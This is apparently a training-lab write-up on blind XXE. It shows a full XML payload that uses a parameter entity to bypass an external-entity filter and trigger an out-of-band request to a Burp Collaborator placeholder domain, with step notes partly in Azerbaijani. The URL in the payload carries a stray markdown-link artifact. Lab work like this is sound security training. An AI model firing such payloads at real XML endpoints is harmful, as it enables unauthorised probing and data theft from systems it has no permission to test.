# Lab 04: Blind XXE via XML Parameter Entities

### 🎯 Objective
Trigger an out-of-band (OAST) interaction with Burp Collaborator using a **Parameter Entity** to bypass basic filters that block regular external entities.

### 🔍 Why Parameter Entities?
In this lab, the application blocks standard external entities like `<!ENTITY xxe SYSTEM "...">`. However, it still allows **Parameter Entities**, which are identified by a percent sign (`%`) and are parsed differently by the XML engine.

### 🛠️ Exploitation Process

1. **The Bypass Payload:**
   Instead of defining an entity to be used in the XML body, we define a parameter entity and immediately call it within the DTD.

   **Final XML Payload:**
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE stockCheck [
     <!ENTITY % xxe SYSTEM "[http://YOUR-COLLABORATOR-ID.oastify.com](http://YOUR-COLLABORATOR-ID.oastify.com)"> 
     %xxe;
   ]>
   <stockCheck>
       <productId>1</productId>
       <storeId>1</storeId>
   </stockCheck>

    How it works:

        % xxe — Parametr entitisini yaradır.

        SYSTEM "http://..." — Sorğu atılacaq ünvanı müəyyən edir.

        %xxe; — Bu, entitini DTD-nin daxilində çağırır (icra edir).

    Verification:

        Request-i göndər.

        Collaborator tabına keç və "Poll now" et.

        DNS və HTTP sorğularını görəcəksən.

🚩 Result

    Observation: Even though regular entities were blocked, the parser processed the parameter entity.

    Status: ✅ Solved
